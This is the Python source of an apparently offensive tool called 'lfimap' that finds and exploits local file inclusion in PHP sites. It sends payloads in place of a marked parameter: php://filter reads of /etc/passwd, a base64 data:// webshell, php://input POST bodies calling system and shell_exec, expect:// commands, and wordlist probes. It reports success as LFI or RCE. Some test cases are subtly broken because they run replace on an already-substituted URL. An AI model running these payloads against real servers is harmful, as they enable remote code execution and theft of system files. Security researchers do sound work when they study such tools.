#!/usr/bin/env python3

import os
import sys
import re
import socket
import subprocess
import random
import argparse
import requests
import requests.exceptions
import base64

from argparse import RawTextHelpFormatter
from urllib.parse import urlsplit
from urllib.parse import urlparse

def prepareHeaders():
    user_agents = [
                            "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
                            "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
                            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
                            "Mozilla/3.01 (Macintosh; PPC)",
                            "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",
                            "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
                            "Opera/8.00 (Windows NT 5.1; U; en)",
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
                ]

    headers = {}
    headers['User-Agent'] = random.choice(user_agents)
    headers['Accept-Language'] = 'en-US;'
    headers['Accept-Encoding'] = 'gzip, deflate'
    headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;'
    headers['Connection'] = 'Close'

    return headers

def addHeader(newKey, newVal):
    headers[newKey] = newVal

def test_wordlist(url):    
    f = open(wordlist, "r")
    
    for line in f:
        line = line[:-1]
        if("DESTROY" in url):
            url = url.replace("DESTROY", line)

        res = requests.get(url, headers = headers)
        
        if("root:x:0:0" in res.text or ":www-data:" in res.text):  
                print("[+] LFI -> " + url)
                
                exploit = url+line
                exploit = exploit.replace('/etc/passwd', '')
 
                return exploit
        else:
            exploit = None

    f.close()
    return exploit

def test_php_filter(url):
    #Test if parameter is vulnerable without encoding
    testCase = "php://filter/resource=/etc/passwd"
    if("DESTROY" in url):
        u = url.replace("DESTROY", testCase)

    res = requests.get(u, headers = headers)
    if("root:x:0:0" in res.text or ":www-data:" in res.text): 
        print("[+] LFI -> " + u)

    #Base64 Encoded
    testCaseTwo = "php://filter/convert.base64-encode/resource=/etc/passwd"
    u = url.replace("DESTROY", testCaseTwo)
    res = requests.get(u, headers = headers)
    if("cm9vdDp4OjA6MD" in res.text or "Ond3dy1kYXRhO" in res.text): 
        print("[+] LFI -> " + u)

    testCaseThree = "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd"
    u = u.replace("DESTROY", testCaseThree)
    res = requests.get(u, headers = headers)

    if("root:x:0:0" in res.text or ":www-data:" in res.text):
        print("[+] LFI -> " + u)
    
    testCaseFour = "php://filter/read=string.rot13/resource=/etc/passwd"
    u = u.replace("DESTROY", testCaseFour)
    res = requests.get(u, headers = headers)
    if("ebbg:k:0:0" in res.text or "jjj-qngn:k" in res.text):
        print("[+] LFI -> " + u)


def test_data_wrapper(url):
    testCase = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/passwd"
    if("DESTROY" in url):
        u = url.replace("DESTROY", testCase)

    res = requests.get(u, headers = headers)
    if("root:x:0:0" in res.text or ":www-data:" in res.text):
        print("[+] LFI -> " + u)


def test_php_input(url):
    urlInput = "php://input&cmd=cat%20/etc/passwd"
    testCase = "<? system('cat /etc/passwd');echo exec($_GET['cmd']);?>"
    if("DESTROY" in url):
        u = url.replace("DESTROY", urlInput)
    
    res = requests.post(u, headers = headers, data= testCase)
    if("root:x:0:0" in res.text or ":www-data:" in res.text):
        print("[+] RCE -> " + u + " -> HTTP POST: " + testCase)


    testCaseTwo = "<?php echo shell_exec($_GET['cmd']) ?>"
    res = requests.post(u, headers = headers, data = testCaseTwo)
    if("root:x:0:0" in res.text or ":www-data:" in res.text):
        print("[+] RCE -> " + u + " -> HTTP POST: " + testCaseTwo)


def test_expect_wrapper(url):
    testCase = "expect://cat%20%2Fetc%2Fpasswd"
    if("DESTROY" in url):
        u = url.replace("DESTROY", testCase)

    res = requests.get(u, headers = headers)
    if("root:x:0:0" in res.text or ":www-data:" in res.text):
        print("[+] RCE -> " + u)



def main():

    #Perform all tests
    if(test_all):
        test_php_filter(url)
        test_php_input(url)
        test_data_wrapper(url)
        test_expect_wrapper(url)
        test_wordlist(url)
        
        print("Done.")
        exit(0)
    
    elif(args.wordlist):
        test_wordlist(url)
    elif(php_filter):
        test_php_filter(url)
    elif(php_input):
        test_php_input(url)
    elif(data_wrapper):
        test_data_wrapper(url)
    elif(expect_wrapper):
        test_expect_wrapper(url)

    #Default behaviour
    else:
        test_php_filter(url)
        test_php_input(url)
        test_data_wrapper(url)
        test_expect_wrapper(url)

    print("Done.")
    exit(0)


if(__name__ == "__main__"):
    
    print("")
    parser = argparse.ArgumentParser(description="lfimap, tool for discovering LFI", formatter_class=RawTextHelpFormatter, add_help=False)

    parser.add_argument('url', type=str, metavar="URL", help="""\t\t Url, Ex: "http://example.org/vuln.php?param=DESTROY" """)
    parser.add_argument('--test-php-filter', action="store_true", dest = 'php_filter', help="\t\t Test php filter")
    parser.add_argument('--test-php-input', action="store_true", dest = 'php_input', help="\t\t Test php input")
    parser.add_argument('--test-data', action="store_true", dest = 'data', help="\t\t Test data wrapper")
    parser.add_argument('--test-expect', action="store_true", dest = 'expect', help="\t\t Test expect wrapper")
    parser.add_argument('-a', '--test-all', action="store_true", dest = 'test_all', help="\t\t Test all above + using wordlist")
    parser.add_argument('-c', type=str, metavar="<cookie>", dest='cookie', help='\t\t Session Cookie, Ex: "PHPSESSID=1943785348b45"')
    parser.add_argument('-w', type=str, metavar="<wordlist>", dest='wordlist', help="\t\t Custom wordlist (default wordlist.txt)")
    parser.add_argument('-h', '--help', action="help", default=argparse.SUPPRESS, help="\t\t Print this help message")

    args = parser.parse_args()

    url = args.url
    php_filter = args.php_filter
    data_wrapper = args.data
    expect_wrapper = args.expect
    php_input = args.php_input
    cookie = args.cookie
    wordlist = args.wordlist
    test_all = args.test_all

    #Checks URL arg
    urlRegex = re.compile(
    r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
    r'localhost|' #localhost...
    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
    r'(?::\d+)?' # optional port
    r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    
    if("DESTROY" not in url):
        print("Please use DESTROY as a vulnerable parameter value that you want to exploit")
        sys.exit(-1)

    if(re.match(urlRegex, url) is None):
        print("URL not valid, exiting...")
        sys.exit(-1)    

    #Checks if provided wordlist arg exists, in main is selects wordlist based on target OS type
    if(wordlist is not None):
        if(not os.path.isfile(wordlist)):
            print("Specified wordlist doesn't exist. Exiting...")
            sys.exit(-1)
    else:
        wordlist = "wordlist.txt"
     
    headers = prepareHeaders()

    if(cookie is not None):
        addHeader('Cookie', cookie)

    main()